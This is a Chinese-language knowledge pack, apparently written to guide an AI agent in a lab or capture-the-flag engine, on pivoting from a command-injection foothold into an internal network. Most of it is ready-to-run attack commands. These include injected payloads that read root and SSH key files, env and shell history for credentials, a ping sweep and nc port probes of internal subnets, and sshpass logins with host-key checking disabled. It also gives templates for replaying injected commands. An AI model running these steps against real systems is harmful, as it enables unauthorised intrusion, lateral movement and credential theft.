# 知识包：内网横向与 pivot

拿到一个命令执行立足点（web RCE / 命令注入 / shell）后，经它打进内网。

## 1. 确认立足点的命令执行能力
- 命令注入：`curl -s -G <url> --data-urlencode "<param>=127.0.0.1;<CMD>"`，看 `<CMD>` 的输出。
- 先验证：注入 `;id`、`;hostname`、`;uname -a` 确认在目标主机上执行、是什么权限。

## 2. 经立足点侦察内网（pivot 视角）
**关键**：你的沙箱直连不到内网，内网命令要**通过立足点执行**（在命令注入/shell 里跑）。
- 看立足点的网络：`;ip addr`、`;ip route`、`;cat /etc/hosts` —— 找第二块网卡 / 内网网段 / 已知主机名。
- 找凭据线索：`;cat /root/* /home/*/* ~/.ssh/* 2>/dev/null`、`;env`、`;history` —— 配置/备注里常留部署账号口令。
- 探内网存活：在立足点上 `for i in $(seq 1 254); do (ping -c1 -W1 10.x.x.$i >/dev/null 2>&1 && echo up $i &); done; wait`，或对已知主机名直接试端口 `;nc -z -w2 <host> 22`。

## 3. 横向到内网主机
- ssh（有口令）：在立足点上 `;sshpass -p '<pwd>' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 <user>@<host> 'hostname; id; cat flag* 2>/dev/null'`
- 成功在内网主机上执行 = 新 shell 立足点 → `report_foothold(access_level="shell", label="shell@<host>", location="<host>", evidence=真实输出)`
- 拿到的敏感文件/flag → report_loot；新凭据 → report_credential。
- **带 `replay.command_template`**（引擎会用随机 nonce 回环主动坐实该立足点，按主机限定）：一条把 `{CMD}` 送进【该主机】shell 的命令。例：
  - web 命令注入入口机：`replay={"command_template": "curl -s -G 'http://lab-member:8080/ping' --data-urlencode 'host=127.0.0.1; {CMD}'"}`
  - 经立足点 ssh 到的内网机：`replay={"command_template": "curl -s -G 'http://lab-edge:8080/ping' --data-urlencode 'host=127.0.0.1; sshpass -p <pwd> ssh -o StrictHostKeyChecking=no <user>@<host> {CMD}'"}`（{CMD} 最终在内网机上执行）

## 要点
- 内网主机是经**立足点转发**打的，命令要嵌在对立足点的 exec 里（命令注入分号、或 ssh 远程命令）。
- 注意 shell 引号/URL 编码：用 `curl --data-urlencode` 避免手工编码；ssh 远程命令用双引号包。
